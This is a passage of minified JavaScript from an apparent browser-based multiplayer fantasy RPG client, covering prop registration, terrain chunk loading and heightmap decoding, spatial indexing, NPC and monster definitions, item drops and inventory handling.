        rP("misc_campfire_1", {
            coll: [Vg, .6, 1]
        }),
        rP("misc_fence_01", {
            coll: [Gg, 3, 1.8, .5]
        }),
        rP("misc_anvil", {
            coll: [Gg, 2.15, 1.18, 1]
        }),
        rP("misc_boat_small_01", {
            coll: [Gg, 5.5, 2, 2.5]
        }),
        rP("misc_mine_entrance", {
            coll: [Gg, 4, 7, 4]
        }),
        rP("misc_pier_01", {
            coll: [Gg, 3.1, .8, 3.1]
        }),
        rP("misc_tent_01", {
            coll: [Gg, 5, 4.5, 3.8]
        }),
        rP("misc_platform", {
            coll: [Gg, 8.9, 6.45, 8.3]
        }),
        rP("misc_lookout", {
            coll: [Gg, 4, 6, 4]
        }),
        rP("misc_bridge_big", {
            coll: [Gg, 15, 40, 8]
        }),
        rP("misc_cart_01", {
            coll: [Gg, 8.8, 5.3, 5.3]
        }),
        rP("misc_stone_rock_slab_quarry_01", {
            coll: [Gg, 8.8, 8.8, 8.8]
        }),
        rP("misc_quarry_crane_01", {
            coll: [Gg, 6.14, 16.5, 19.5]
        }),
        rP("misc_ladder_wood", {
            coll: [Gg, 1.8, 5.2, 1.8]
        }),
        rP("misc_foliage_tree_dead", {
            coll: [Vg, 2.6, 7.7]
        }),
        rP("misc_market_stand"),
        rP("misc_house_wood_01", {
            coll: [Gg, 5, 5.5, 5.2]
        }),
        rP("misc_building_desert_house_hut_adobe_tall", {
            coll: [Gg, 8.35, 11.55, 8.35]
        }),
        rP("misc_building_desert_house_hut_adobe_small", {
            coll: [Gg, 8.35, 6.35, 10.85]
        }),
        rP("misc_foliage_desert_cactus_big", {
            coll: [Vg, .8, 2.75]
        }),
        rP("misc_foliage_desert_cactus_small", {
            coll: [Vg, 1.35, 1.25]
        }),
        rP("misc_fortification_wood_details_01", {
            coll: [Gg, 2.75, 1.55, 1]
        }),
        rP("misc_fortification_wood_wall_01", {
            coll: [Gg, 12.5, 6.8, 6.6]
        }),
        rP("misc_fortification_wood_tower_01", {
            coll: [Gg, 8, 10.7, 8]
        }),
        rP("misc_fortification_wood_bridge_01", {
            coll: [Gg, 8.7, 1, 4.4]
        }),
        rP("misc_flag_vg_01", {
            double: !0,
            coll: [Gg, .6, 1.6, .15]
        }),
        rP("misc_flag_vg_02", {
            double: !0
        }),
        rP("misc_flag_bl_01", {
            double: !0,
            coll: [Gg, .6, 1.6, .15]
        }),
        rP("misc_flag_bl_02", {
            double: !0
        }),
        rP("misc_palisade_01", {
            coll: [Gg, 7.8, 7, 1.5]
        }),
        rP("misc_palisade_solo", {
            coll: [Gg, 1.2, 6.4, 1.2]
        }),
        rP("misc_wood_wall_01", {
            coll: [Gg, 6.4, 5.5, 2.5]
        }),
        rP("misc_grave_stone_01", {
            coll: [Gg, .5, 1.2, .8]
        }),
        rP("misc_grave_stone_02", {
            coll: [Gg, .5, 1.2, .8]
        }),
        rP("misc_grave_wood_01", {
            coll: [Gg, .5, 1.2, .8]
        }),
        rP("misc_graveyard_coffin_01", {
            coll: [Gg, 2.13, 1.63, 3.5]
        }),
        rP("misc_graveyard_coffin_open_01", {
            coll: [Gg, 2.13, 1.63, 3.5]
        }),
        rP("misc_statue_cyclops", {
            coll: [Vg, 5, 20]
        }),
        rP("misc_cage_01", {
            coll: [Gg, 2.6, 4, 2.6]
        }),
        rP("misc_sign", {
            coll: [Gg, 1.8, 1.5, .5]
        }),
        rP("misc_ruins_big_dome_01", {
            coll: [Vg, 20.5, 8.39]
        }),
        rP("misc_ruins_big_dome_01_broken", {
            coll: [Vg, 20.5, 11.9]
        }),
        rP("misc_ruins_big_tower_01", {
            coll: [Gg, 8.77, 18.08, 8.77]
        }),
        rP("misc_ruins_big_tower_broken_01", {
            coll: [Gg, 8.77, 13.1, 8.77]
        }),
        rP("misc_ruins_big_wall_01", {
            coll: [Gg, 15.46, 13.64, 4.68]
        }),
        rP("misc_ruins_big_wall_broken_01", {
            coll: [Gg, 13.79, 13.64, 4.68]
        }),
        rP("misc_ruins_column_01", {
            coll: [Gg, 1.5, 5.3, 1.5]
        }),
        rP("misc_ruins_column_broken_01", {
            coll: [Gg, 1.5, 2.25, 1.5]
        }),
        rP("misc_ruins_slab_01", {
            coll: [Gg, 5.7, 2.1, 1.9]
        }),
        rP("misc_ruins_slab_small_01", {
            coll: [Gg, 1.51, 1.1, 1.5]
        }),
        rP("misc_ruins_stone_01", {
            coll: [Gg, 8.77, 18.08, 8.77]
        }),
        rP("misc_tool_pickaxe"),
        rP("misc_tool_axe"),
        rP("misc_tool_axe_double"),
        rP("misc_tool_hammer"),
        rP("misc_tool_hoe"),
        rP("misc_tool_shovel"),
        rP("misc_hay_bale", {
            coll: [Gg, 4.2, 3.7, 3.7]
        }),
        rP("misc_hay_pile", {
            coll: [Vg, 2, 2]
        }),
        rP("misc_hay_bundle", {
            coll: [Vg, 2, 3]
        }),
        rP("misc_bones_big", {
            coll: [Vg, .7, 3]
        }),
        rP("misc_bones_skull"),
        rP("misc_artifacts_monolith_dek_01", {
            effect: {
                ..._f.mystical01,
                offset: [0, 0, 0]
            },
            coll: [Gg, 3.74, 5.28, 3.6]
        }),
        rP("misc_campfire_lit", {
            throwShadow: !1,
            effect: {
                ..._f.campfire,
                offset: [0, .4, 0]
            },
            coll: [Vg, .7, .5]
        }, "misc_campfire_1.ho"),
        rP("misc_lantern", {
            throwShadow: !1
        }),
        iP("rocks1"),
        aP("rocks"),
        rP("rock_01", {
            gY: 10,
            coll: [Vg, .8, .7]
        }),
        rP("rock_02", {
            gY: 10,
            coll: [Vg, .4, .5]
        }),
        rP("rock_stone_boulder_small_01", {
            gY: 50,
            coll: [Vg, 4, 8]
        }),
        rP("rock_stone_boulder_medium_01", {
            gY: 50,
            coll: [Vg, 6, 13]
        }),
        rP("rock_stone_tall_medium_01", {
            gY: 50,
            coll: [Vg, 5.2, 21.66]
        }),
        aP("foliage"),
        iP("props/bush01.png"),
        rP("foliage_bush_01"),
        iP("props/tree1.png"),
        iP("props/pine_tree.png"),
        rP("foliage_pine_tree", {
            double: !0,
            receiveShadow: !0,
            coll: [Vg, 2, 40]
        }),
        iP("atlas1"),
        rP("foliage_tree_stump", {
            coll: [Vg, .7, 1.5]
        }),
        rP("foliage_tree_trunk_01", {
            coll: [Gg, 6, 1, 1]
        }),
        iP("props/foliage/tree_guardstone_small.png"),
        rP("tree_guardstone_small", {
            id: 68677437,
            tree: !0,
            receiveShadow: !0,
            double: !0,
            coll: [Vg, 1, 10]
        }),
        iP("props/foliage/tree_guardstone_big.png"),
        rP("tree_guardstone_big", {
            id: 1576243494,
            tree: !0,
            receiveShadow: !0,
            double: !0,
            coll: [Vg, 9.64, 60]
        }),
        iP("props/foliage/tree_guardstone_medium.png"),
        rP("tree_guardstone_medium", {
            id: 68677436,
            tree: !0,
            receiveShadow: !0,
            double: !0,
            coll: [Vg, 4.1, 30]
        }),
        iP("atlas1"),
        aP("primitives"),
        rP("primitive_cube_1"),
        rP("environmental_ocean", {
            invisible: !0,
            throwShadow: !1,
            effect: {
                ..._f.oceanAmbience
            }
        }, "primitive_cube_1.ho"),
        rP("environmental_city", {
            invisible: !0,
            throwShadow: !1,
            effect: {
                ..._f.cityAmbience
            }
        }, "primitive_cube_1.ho"),
        rP("environmental_mystic", {
            invisible: !0,
            throwShadow: !1,
            effect: {
                ..._f.mysticAmbience
            }
        }, "primitive_cube_1.ho"),
        rP("environmental_evil", {
            invisible: !0,
            throwShadow: !1,
            effect: {
                ..._f.evilAmbience
            }
        }, "primitive_cube_1.ho"),
        tP.error = {
            geometry: "engine/error.ho",
            texture: "engine/error.jpg",
            meta: {}
        };
    class oP {
        constructor(t) {
            this.id = 0,
                this.Za = [-0, -0, -0],
                this.rot = [-0, -0, -0],
                this.scale = 1
        }
        onUpdate(t, e, s) {
            this.shape && (t.remove(this.shape),
                this.shape.onRemove());
            const i = tP[this.id] && tP[this.id].meta.coll;
            i && (this.shape = new i[0](this, s, this.rot[1], Qi([0, 0, 0], e, this.Za), i[1] ? i[1] * this.scale : 0, i[2] ? i[2] * this.scale : 0, i[3] ? i[3] * this.scale : 0),
                t.add(this.shape))
        }
        onRemove(t) {
            this.shape && (t && t.remove(this.shape),
                this.shape.onRemove())
        }
    }
    class lP extends oP {
        constructor(t) {
            super(t || {})
        }
        onUpdate(t, e, s) {
            super.onUpdate(t, e, s);
            const i = tP[this.id] || tP.error;
            if (!this.mesh) {
                let t = jc.multimeshTextured;
                i.meta.gY && (t = jc.multimeshTileable),
                    i.meta.tree && (t = jc.multimeshTree),
                    this.mesh = Kh({
                        geo: i.geometry,
                        tex: i.texture,
                        program: t,
                        ts: i.meta.throwShadow,
                        rs: i.meta.receiveShadow,
                        cull: i.meta.double ? 0 : void 0,
                        visible: !i.meta.invisible
                    }),
                    i.meta.gY && (this.mesh.data.gY = this.scale * i.meta.gY)
            }
            Qi(this.mesh.position, e, this.Za),
                Vi(this.mesh.rotation, this.rot[0], this.rot[1], this.rot[2]),
                this.mesh.rotationNeedsUpdate = !0,
                Gi(this.mesh.scale, this.scale),
                this.mesh.updateMatrix(),
                this.mesh.updateMatrixWorld(!0),
                this.mesh.data.multi.needsUpdate = !0,
                i.meta.effect && void 0 === this.effect && (this.effect = td(i.meta.effect, this.effect, this.mesh),
                    this.effect.data.origin = [0, 0, 0],
                    void 0 !== i.meta.effect.offset && Yi(this.effect.data.origin, i.meta.effect.offset),
                    Yi(this.effect.position, this.effect.data.origin),
                    this.effect.updateMatrix(),
                    this.effect.updateMatrixWorld(!0))
        }
        onRemove(t) {
            super.onRemove(t),
                this.effect && (this.effect.setParent(null),
                    this.effect.data.remove = !0),
                this.mesh && (this.mesh.data.multi.remove(this.mesh),
                    this.mesh = void 0)
        }
        onHide() {
            this.effect && (this.effect.data.remove = !0,
                this.effect = void 0)
        }
    }
    class cP {
        constructor(t) {
            this.id = t.id,
                this.origin = [64 * t.x, 0, 64 * t.z],
                this.center = Qi([0, 0, 0], this.origin, [32, 0, 32]),
                this.deserialized = !1,
                this.props = {},
                this.intHeights = [],
                this.normals = [],
                this.steepness = [],
                this.left = void 0,
                this.right = void 0,
                this.front = void 0,
                this.back = void 0,
                this.frontRight = void 0,
                this.backLeft = void 0
        }
        tickDelta() { }
        tickFixed() { }
        deserialize(t) {
            this.parse(oo.chunk.decode(t))
        }
        parse(t) {
            if (this.data = t,
                0 == this.normals.length)
                for (let t = 0, e = 8192; t < e; ++t)
                    this.normals[t] = [0, 0, 0];
            this.unpackIntHeights(),
                this.unpackProps(),
                this.deserialized = !0
        }
        getIndex(t, e, s) {
            return t + (s ? 64 : 65) * e
        }
        getIndexFromWorld(t, e, s) {
            return t -= this.origin[0],
                e -= this.origin[2],
                this.getIndex(t, e, s)
        }
        getHeight(t, e) {
            const s = t % 1
                , i = e % 1;
            if (0 === s && 0 === i)
                return .030517578125 * this.intHeights[t + 65 * e];
            {
                const n = Math.floor(t)
                    , a = Math.floor(e)
                    , r = s + i < 1
                    , o = r ? -(s - 1 + i) : -(i - 1)
                    , l = r ? i : -(s - 1);
                return .030517578125 * (o * this.intHeights[n + 65 * a + (r ? 0 : 1)] + l * this.intHeights[n + 65 * (a + 1)] + (1 - o - l) * this.intHeights[n + 1 + 65 * (a + (r ? 0 : 1))])
            }
        }
        getHeightFromWorld(t, e) {
            return t -= this.origin[0],
                e -= this.origin[2],
                this.getHeight(t, e)
        }
        getTriangleIndex(t, e) {
            let s = 2 * Math.floor(t) + 64 * Math.floor(e) * 2;
            return t % 1 + e % 1 > 1 && s++,
                s
        }
        getNormal(t, e) {
            return this.normals[this.getTriangleIndex(t, e)]
        }
        getSteepness(t, e) {
            return this.steepness[this.getTriangleIndex(t, e)]
        }
        updateTriangles(t = !1) {
            for (let e = 0; e < 64; ++e)
                for (let s = 0; s < 64; ++s) {
                    if (t && s > 1 && e > 1 && e < 63 && s < 63)
                        continue;
                    const i = 2 * s + 64 * e * 2;
                    let n = this.normals[i];
                    Vi(Xa, s, this.getHeight(s, e), e),
                        Vi(Ha, s, this.getHeight(s, e + 1), e + 1),
                        Vi(Ka, s + 1, this.getHeight(s + 1, e), e),
                        cr(n, Xa, Ha, Ka),
                        this.steepness[i] = 1 - ln(n, La),
                        n = this.normals[i + 1],
                        Vi(Xa, s + 1, this.getHeight(s + 1, e), e),
                        Vi(Ka, s + 1, this.getHeight(s + 1, e + 1), e + 1),
                        cr(n, Xa, Ha, Ka),
                        this.steepness[i + 1] = 1 - ln(n, La)
                }
        }
        unpackIntHeights() {
            for (let t = 0; t < 65; ++t)
                for (let e = 0; e < 65; ++e) {
                    const s = e + 65 * t;
                    if (64 == e || 64 == t) {
                        const i = this.getNeighborChunk(e, t);
                        i && i.deserialized ? this.intHeights[s] = i.intHeights[e % 64 + t % 64 * 65] : this.intHeights[s] = this.intHeights[64 == e ? s - 1 : e + 65 * (t - 1)]
                    } else
                        this.intHeights[s] = 0 == e ? this.data.terrain.readUInt16BE(65 * t) : this.intHeights[s - 1] + (this.data.terrain.readUInt8(65 * t + 1 + e) - 127)
                }
            this.updateTriangles()
        }
        getNeighborChunk(t, e) {
            return t < 64 ? this.front : e < 64 ? this.right : this.frontRight
        }
        getWorldFromLocal(t) {
            return [t[0] + this.origin[0], t[1], t[2] + this.origin[2]]
        }
        unpackProps() {
            const t = {};
            for (let e = 0, s = this.data.props.length; e < s; ++e) {
                const s = this.data.props[e];
                null == this.props[s.id] && (this.props[s.id] = []),
                    void 0 === t[s.id] && (t[s.id] = 0);
                const i = Vd(this, this.props[s.id][t[s.id]] || new lP, s);
                i.onUpdate(Ua.grids.props, this.origin, Ua.bounds),
                    this.props[s.id][t[s.id]] = i,
                    t[s.id]++
            }
            for (const e in this.props) {
                const s = t[e] || 0;
                if (this.props[e] && s < this.props[e].length) {
                    for (let t = s; t < this.props[e].length; ++t)
                        this.props[e][t].onRemove(Ua.grids.props);
                    this.props[e].splice(s)
                }
            }
        }
        destroy() {
            this.left = void 0,
                this.right = void 0,
                this.front = void 0,
                this.back = void 0,
                this.frontRight = void 0,
                this.backLeft = void 0;
            for (const t in this.props)
                this.props[t].forEach(t => t.onRemove())
        }
    }
    const hP = 0
        , dP = t => (t + 1 >>> 1) - 1
        , uP = t => 1 + (t << 1)
        , mP = t => t + 1 << 1;
    class pP {
        constructor(t = ((t, e) => t > e)) {
            this._heap = [],
                this._comparator = t
        }
        size() {
            return this._heap.length
        }
        isEmpty() {
            return 0 == this.size()
        }
        peek() {
            return this._heap[hP]
        }
        push(...t) {
            return t.forEach(t => {
                this._heap.push(t),
                    this._siftUp()
            }
            ),
                this.size()
        }
        pop() {
            const t = this.peek()
                , e = this.size() - 1;
            return e > hP && this._swap(hP, e),
                this._heap.pop(),
                this._siftDown(),
                t
        }
        replace(t) {
            const e = this.peek();
            return this._heap[hP] = t,
                this._siftDown(),
                e
        }
        _greater(t, e) {
            return this._comparator(this._heap[t], this._heap[e])
        }
        _swap(t, e) {
            [this._heap[t], this._heap[e]] = [this._heap[e], this._heap[t]]
        }
        _siftUp() {
            let t = this.size() - 1;
            for (; t > hP && this._greater(t, dP(t));)
                this._swap(t, dP(t)),
                    t = dP(t)
        }
        _siftDown() {
            let t = hP;
            for (; uP(t) < this.size() && this._greater(uP(t), t) || mP(t) < this.size() && this._greater(mP(t), t);) {
                const e = mP(t) < this.size() && this._greater(mP(t), uP(t)) ? mP(t) : uP(t);
                this._swap(t, e),
                    t = e
            }
        }
    }
    const fP = new pP((t, e) => t.id > e.id);
    class gP extends cP {
        constructor(t) {
            super(t),
                this.geometry = {},
                this.meshes = {},
                this.state = 0
        }
        load() {
            this.state > 0 || (fP.push(this),
                this.state = 1,
                fetch(`worlddata/${Ua.file}/${this.id}?v=4002247`, {
                    cache: "default"
                }).then(t => {
                    t.arrayBuffer().then(t => {
                        this.loaded = Hr(t),
                            fP.peek().queueLoad()
                    }
                    )
                }
                ))
        }
        queueLoad() {
            if (this.loaded) {
                this.state = 2,
                    this.deserialize(this.loaded),
                    this.meshes.terrain.updateMatrix(),
                    this.meshes.terrain.updateMatrixWorld(!1),
                    this.loaded = void 0,
                    fP.pop();
                const t = fP.peek();
                t ? t.queueLoad() : Ua.unsetLoading && (ee.set(!1),
                    Ua.unsetLoading = !1,
                    Vt.set({
                        type: "rF",
                        text: Ua.file.replace(/_/g, " "),
                        time: 5e3
                    }),
                    QT(Ua))
            }
        }
        isInRange(t) {
            return !(t.player && nn(t.player.Za, this.center) - 32 > Gu)
        }
        tickDelta(t, e, s) {
            if (super.tickDelta(t, e, s),
                this.isInRange(s)) {
                if (this.state < 1)
                    this.load();
                else if (this.state >= 2 && null == this.meshes.terrain.parent) {
                    for (const t in this.props)
                        this.props[t].forEach(t => t.onUpdate(s.grids.props, this.origin, s.bounds));
                    this.meshes.terrain.setParent(Yu)
                }
            } else if (this.state >= 2 && null !== this.meshes.terrain.parent) {
                for (const t in this.props)
                    this.props[t].forEach(t => t.onHide());
                this.meshes.terrain.setParent(null)
            }
        }
        parse(t) {
            ji.detailprops || (t.props = t.props.filter(t => void 0 !== tP[t.id] && tP[t.id].meta.coll)),
                super.parse(t, ji.detailprops),
                this.rebuild({
                    heightmap: !0,
                    texture: !0,
                    foliage: !0,
                    props: !0,
                    water: !0
                });
            const e = {
                heightmap: !0,
                triangles: !0,
                texture: !0,
                foliage: !1,
                water: !0,
                seams: !0,
                props: !1
            };
            this.left && this.left.state > 1 && this.left.rebuild(e),
                this.back && this.back.state > 1 && this.back.rebuild(e),
                this.backLeft && this.backLeft.state > 1 && this.backLeft.rebuild(e)
        }
        rebuild(t = {
            heightmap: !0,
            texture: !0,
            foliage: !0,
            intHeights: !1,
            props: !0,
            water: !0
        }) {
            t.intHeights ? this.unpackIntHeights() : (t.heightmap || t.triangles) && (t.seams && this.updateHeightmapSeam(),
                this.updateTriangles(t.seams)),
                t.unpackprops && this.unpackProps(),
                om(this, t)
        }
        updateHeightmapSeam() {
            for (let t = 0; t < 65; ++t)
                for (let e = 64 == t ? 0 : 64; e < 65; ++e) {
                    const s = this.getNeighborChunk(e, t)
                        , i = e + 65 * t;
                    s && s.deserialized && (this.intHeights[i] = s.intHeights[e % 64 + t % 64 * 65])
                }
        }
        destroy() {
            super.destroy(),
                lm(this)
        }
        sendToServer() {
            storeChunk(this.id, Ua.file, this.serializedData)
        }
    }
    class vP {
        constructor(t, e) {
            this.size = t,
                this.div = e,
                this.cellCount = e * e,
                this.cellSize = t / e,
                this.cells = [];
            for (let t = 0; t < this.cellCount; ++t)
                this.cells.push([])
        }
        localize(t) {
            let e = !1;
            return e = t.gl != (t.gl = Math.floor(t.l / this.cellSize)) || e,
                e = t.gr != (t.gr = Math.ceil(t.r / this.cellSize)) || e,
                e = t.gu != (t.gu = Math.floor(t.u / this.cellSize)) || e,
                e = t.gd != (t.gd = Math.ceil(t.d / this.cellSize)) || e,
                e
        }
        add(t) {
            this.localize(t);
            for (let e = t.gu; e < t.gd; ++e)
                for (let s = t.gl; s < t.gr; ++s)
                    this.cells[e * this.div + s].push(t)
        }
        update(t) {
            const e = t.gl
                , s = t.gr
                , i = t.gu
                , n = t.gd;
            if (this.localize(t))
                for (let a = Math.min(i, t.gu); a < Math.max(n, t.gd); ++a)
                    for (let i = Math.min(e, t.gl); i < Math.max(s, t.gr); ++i) {
                        const e = a >= t.gu && a < t.gd && i >= t.gl && i < t.gr
                            , s = this.cells[a * this.div + i]
                            , n = s.indexOf(t);
                        !e && n >= 0 ? s.splice(n, 1) : e && n < 0 && s.push(t)
                    }
        }
        remove(t) {
            for (let e = t.gu; e < t.gd; ++e)
                for (let s = t.gl; s < t.gr; ++s) {
                    const i = e * this.div + s
                        , n = this.cells[i].indexOf(t);
                    n >= 0 && this.cells[i].splice(n, 1)
                }
        }
        query(t) {
            const e = Math.floor(t.l / this.cellSize)
                , s = Math.ceil(t.r / this.cellSize)
                , i = Math.floor(t.u / this.cellSize)
                , n = Math.ceil(t.d / this.cellSize)
                , a = [];
            for (let r = i; r < n; ++r)
                for (let i = e; i < s; ++i) {
                    const e = this.cells[r * this.div + i];
                    for (let s = 0, i = e.length; s < i; ++s) {
                        const i = e[s];
                        i != t && _y(t, i) && a.indexOf(i) < 0 && a.push(i)
                    }
                }
            return a
        }
    }
    class yP extends qf {
        constructor(t) {
            super({
                QY: kf.blacksteel,
                colEyes: kf.fireorange,
                ...t
            }),
                this.eyes.position[1] += .1,
                this.kilt = this.mesh(this.chest, null, kf.leather),
                Vi(this.kilt.scale, 1.1, .6, .4),
                this.kilt.position[1] = -.5,
                this.kilt.position[2] = .35,
                this.hammer = this.mesh(this.hands[0], null, kf.woodbrown),
                Vi(this.hammer.scale, .25, .25, 1.2),
                this.hammerhead = this.mesh(this.hammer, null, kf.darksteel),
                this.setShoulders(kf.greysteel)
        }
        tickParts(t, e, s) {
            super.tickParts(t, e, s);
            const i = this.hands[0];
            Ji(i.rotation, .9, -.4, 0),
                i.position[2] -= .1,
                i.rotationNeedsUpdate = !0
        }
    }
    class bP extends Zy {
        constructor(t) {
            super({
                type: 6,
                size: 1.2,
                name: "Blacksmith",
                ...t
            })
        }
    }
    class wP extends bP {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.blacksmith
            })
        }
        makeTransform() {
            this.transform = new yP({
                entity: this
            })
        }
    }
    class xP extends qf {
        constructor(t) {
            super({
                QY: kf.paleskin,
                ...t
            }),
                this.robe = this.mesh(this.chest, "character/robe.ho", kf.magicblue),
                Vi(this.robe.scale, 1.2, 1.2, 1.2),
                Vi(this.robe.rotation, 0, 0, 0),
                Vi(this.robe.position, 0, -.9, .05),
                this.robe.rotationNeedsUpdate = !0
        }
        tickFixed() { }
        tickParts(t, e, s) {
            super.tickParts(t, e, s),
                this.hands.forEach((t, e) => {
                    if (!t.visible)
                        return;
                    const s = this.cycle(1.3);
                    Vi(t.rotation, .78, 0, e ? .2 * s : .2 * -s),
                        Vi(t.position, e ? .2 : -.2, -.4, .6),
                        t.rotationNeedsUpdate = !0
                }
                )
        }
    }
    class kP extends Zy {
        constructor(t) {
            super({
                type: 2,
                size: 1.2,
                name: "Conjurer",
                ...t
            })
        }
    }
    class $P extends kP {
        constructor(t) {
            super({
                ...t,
                ...Xi.npcs.conjurer
            })
        }
        interact(t) {
            const e = Hr.from(t.splice(1)).toString().split("#");
            "" !== e[0] ? this.setDialogue(this.interactions[0].text, Array.from(e, t => {
                const e = t.split("~");
                return this.interactions[0].choices[0].replace("$1", e[0]) + (e[1] > 0 ? ` (Lv. ${e[1]}+)` : "")
            }
            )) : this.setDialogue(this.interactions[0].text, []),
                super.interact(t)
        }
        makeTransform() {
            this.transform = new xP({
                entity: this
            })
        }
    }
    class SP extends iv {
        constructor(t) {
            super({
                type: 3,
                ...t
            }),
                this.partytimeout = 0,
                this.party = 0,
                this.droptype = "",
                this.tier = 0,
                this.quality = 0
        }
        partyTimeoutCheck(t) {
            return 0 === this.party || t.id === this.party || t.party === this.party || Ua.time > this.partytimeout
        }
        canBePickedUpBy(t) {
            return this.partyTimeoutCheck(t) && t.squaredDistance(this.Za) < 30
        }
    }
    class EP extends SP {
        constructor(t) {
            super(t),
                this.transform = Kh({
                    geo: "drop/drop.ho",
                    tex: "items.png",
                    program: jc.drop,
                    ts: !1,
                    rs: !1,
                    dynamic: !1
                }),
                this.transform.data.multi.needsUpdate = !1,
                this.size = .2,
                this.transform.visible = !1,
                this.uiTimeout = 0,
                this.dirty = !1,
                this.hasInfo = !1,
                this.hasPos = !1,
                this.hasRot = !1,
                this.color = "misc"
        }
        postDelta(t, e, s) {
            if (this.transform.visible && this.dirty && s.getChunkFromWorld(this.Za[0], this.Za[2]).deserialized) {
                this.Za[1] = this.getWorldYBody(s, this.Za[0], this.Za[2]) + .1 * Math.random() + .1,
                    this.transform.position[0] = this.Za[0],
                    this.transform.position[1] = this.Za[1],
                    this.transform.position[2] = this.Za[2],
                    Vi(Oa, 0, 1, 0);
                const t = s.getNormal(this.Za[0], this.Za[2]);
                Gn(this.transform.quaternion, Oa, t),
                    this.transform.rotFromQuaternion(),
                    this.transform.rotation[1] = this.rot,
                    this.transform.rotationNeedsUpdate = !0,
                    this.transform.matrixAutoUpdate = !0,
                    this.transform.updateMatrixWorld(!0),
                    this.transform.data.multi.needsUpdate = !0,
                    this.dirty = !1
            }
        }
        setXZPos(t) {
            this.hasPos || (this.hasPos = !0,
                super.setXZPos(t),
                this.dirty = !0)
        }
        setRot(t) {
            this.hasRot || (this.hasRot = !0,
                super.setRot(t),
                this.dirty = !0)
        }
        setDropInfo(t, e, s, i, n) {
            let a, r;
            this.hasInfo = !0,
                this.party = i,
                this.partytimeout = n,
                this.droptype = el[t],
                this.tier = e,
                this.quality = s,
                "gold" == this.droptype ? (this.name = this.tier + "c",
                    this.size = .1,
                    a = "gold",
                    this.color = "gold",
                    this.quality = 100) : (a = this.droptype + this.tier,
                        r = Ky[a],
                        r && (this.name = Hi(this.droptype, this.tier)),
                        "misc" !== this.droptype && "rune" !== this.droptype && "book" !== this.droptype ? (this.color = xf(s)[1],
                            ji.itemQualityPercent && (this.name += ` ${this.quality}%`)) : (this.color = this.droptype,
                                this.quality = 100));
            const o = r && r.art || a;
            this.transform.data.oK = Zo[o],
                Vi(this.transform.scale, 20 * Zo[o][0], 1, 20 * Zo[o][1]),
                this.transform.data.Tz = [6.1 * Math.random(), 0, 0, 0],
                this.dirty = !0,
                this.transform.visible = !0
        }
        onRemove() {
            this.transform.data.multi.remove(this.transform),
                this.transform.setParent(null),
                $l.shift.down && (DT.add(this),
                    this.uiTimeout = 5 * Math.round(Ua.time / 5) + 10)
        }
    }
    const MP = {
        0: {
            size: 3,
            name: "King",
            stationary: !0,
            nodespawn: !0,
            exp: 2,
            aggroRange: 42,
            statfactor: {
                0: 40,
                10: 40,
                11: 40,
                1: 200,
                15: 4
            },
            skills: [0, 3]
        },
        1: {
            size: 2,
            name: "Warden",
            stationary: !0,
            nodespawn: !0,
            exp: 2,
            aggroRange: 42,
            statfactor: {
                10: 30,
                11: 30,
                0: 30,
                1: 100,
                15: 5
            },
            skills: [0, 2, 3, 33]
        },
        2: {
            size: .9,
            name: "Grub",
            height: .8,
            skills: [0]
        },
        3: {
            size: 1.1,
            exp: 1.1,
            name: "Skeleton",
            skills: [0]
        },
        4: {
            size: 1.2,
            exp: 1.1,
            name: "Zombie",
            skills: [0]
        },
        5: {
            size: 1,
            exp: 1.1,
            name: "Crawler",
            height: .8,
            skills: [0]
        },
        6: {
            size: 1,
            exp: 1.1,
            name: "Skeleton Archer",
            statfactor: {
                10: .35,
                11: .35
            },
            skills: [5]
        },
        7: {
            size: 1,
            exp: 2,
            name: "Golem",
            height: 2.8,
            statfactor: {
                10: 2,
                11: 2,
                6: 1.5,
                15: .6
            },
            skills: [0]
        },
        8: {
            size: 1,
            exp: 1.5,
            name: "Warrior",
            statfactor: {
                6: 1.5,
                15: 1.2
            },
            skills: [0]
        },
        9: {
            size: 1,
            exp: 1,
            name: "Archer",
            statfactor: {
                6: .8,
                11: .35,
                10: .35,
                15: 1.2
            },
            skills: [5]
        },
        10: {
            size: 1.3,
            exp: 2,
            name: "Warrior",
            statfactor: {
                6: 3,
                15: 1.3
            },
            skills: [0]
        },
        11: {
            size: 1,
            exp: 0,
            height: 2.7,
            statfactor: {
                6: 100,
                8: 100
            }
        }
    };
    class _P extends Py {
        constructor(t) {
            super({
                type: 7,
                size: 1,
                name: "Training Dummy",
                ...t
            }),
                this.static = !0,
                this.class = 5,
                this.behavior = MP[11],
                this.height = this.behavior.height
        }
    }
    class CP extends Of {
        constructor(t) {
            super(t),
                this.block = this.mesh(this, null, kf.woodbrown),
                Vi(this.block.scale, .3, 3, .3),
                Vi(this.block.position, 0, -.5, 0),
                this.chest = this.mesh(this, null, kf.woodbrown2),
                Vi(this.chest.scale, 1, 2, 1),
                Vi(this.chest.position, 0, .9, 0),
                this.arms = this.mesh(this, null, kf.woodbrown),
                Vi(this.arms.scale, 3, .3, .3),
                Vi(this.arms.position, 0, 1.1, 0)
        }
        tickFixed(t, e, s) {
            this.tickPushBack(t, e, s)
        }
        tickParts(t, e, s) {
            Vi(this.rotation, 2 * -this.pushBack[1], this.entity.rot, 2 * this.pushBack[0]),
                this.rotationNeedsUpdate = !0
        }
    }
    class TP extends _P {
        constructor(t) {
            super({
                ...t
            }),
                this.remakeTransform()
        }
        makeTransform() {
            this.transform = new CP({
                entity: this
            })
        }
    }
    class PP {
        constructor(t) {
            this.entity = t,
                this.slots = new Map,
                this.gold = 0,
                this.medals = 0,
                this.setSize(0)
        }
        tickFixed(t, e, s) { }
        setSize(t) {
            this.size = Math.min(100, t)
        }
        setGold(t) {
            this.gold = t
        }
        setMedals(t) {
            this.medals = t
        }
        setItem(t, e) {
            const s = new FE(e);
            return this.slots.set(t, s),
                s
        }
        removeItem(t) {
            const e = this.slots.get(t);
            return this.slots.delete(t),
                e
        }
        async hydrateItems(t = !1) {
            const e = []
                , s = [];
            if (this.slots.forEach((t, i) => {
                t.dirty && (t.dirty = !1,
                    e.push(t.dbid),
                    s.push(i))
            }
            ),
                e.length) {
                const i = await this.fetchData(e);
                this.compareData(i, s, 0),
                    this.postHydrate(s, t)
            } else
                t && this.postHydrate(s, t)
        }
        hydrate(t) {
            this.slots.has(t.slot) ? this.slots.get(t.slot).hydrate(t) : console.error("received hydration of unknown item")
        }
        postHydrate(t) { }
        compareData(t, e, s) {
            t.forEach(t => {
                null !== t.slot && (this.hydrate(t),
                    e = e.filter(e => e !== t.slot))
            }
            ),
                e.forEach(t => this.removeItem(t, s))
        }
        findFirstItemOfType(t, e) {
            for (const s of this.slots)
                if (s[1].type == t && s[1].tier == e)
                    return s[1]
        }
        findFirstSlotOfType(t, e) {
            let s = -1;
